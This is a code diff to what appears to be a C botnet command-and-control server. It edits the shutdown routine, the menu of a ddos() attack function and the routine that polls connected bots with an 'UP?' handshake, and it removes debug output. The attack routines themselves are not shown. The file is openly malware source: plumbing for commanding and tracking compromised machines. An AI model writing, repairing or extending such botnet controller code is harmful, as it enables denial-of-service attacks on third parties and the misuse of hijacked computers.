@@ -8,6 +8,7 @@ CONNS cons;
 pthread_t accept_thread;
 int main_sock;
 struct sockaddr_in serverAddr;
+char STOPFLAG = 0;
 
 void start()
 {
@@ -48,15 +49,18 @@ void init()
 void close_all()
 {
 	// Stop Receiving Connections by connecting to the other thread.
-	pthread_kill(accept_thread, 2);
+	STOPFLAG = 1;
+	pthread_join(accept_thread, NULL);
 	struct connections *connects = &cons;
 	send_to_bots("[!SHUTDOWN!]");
 	while(connects != NULL){
 		// here sould have a protocol that will close the connection for a bot and cause it to stop running. 
 		close(connects->sock);
-		printf("Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
+		printf("[i] Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
 		connects = connects->next;
 	}
+	close(main_sock);
+	_exit(0);
 }
 
 void sig_handler(int signo)
@@ -210,8 +214,6 @@ void ddos()
 		}else if(strncmp(reply, "q", 1) == 0){
 			printf("[+] Shutting down all services\n");
 			close_all();
-			exit(0);
-
 		}else{
 			printf("\033[0;31m[-] Wrong Choice!\033[0m\n");
 		}
@@ -231,9 +233,6 @@ void ls_all_bots()
 	while(connects != NULL){
 		if(sendto(connects->sock, "UP?", 3, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr)) == -1) {
 			connects = connects->next;
-			// DEBUG
-			printf("Exiting UP?\n");
-			perror("Unable Send data");
 			continue;
 		}
 		
@@ -241,9 +240,6 @@ void ls_all_bots()
 
 		recvfrom(connects->sock, temp, 8, 0, (struct sockaddr *)&connects->client_conn, &temp_size);
 		
-		// DEBUG
-		printf("Data: %s\n", temp);
-
 		if(strncmp(temp, "?YES!", 5) == 0) {
 			printf("# %d Connection From => %s\n", i, inet_ntoa(connects->client_conn.sin_addr));
 			i++;
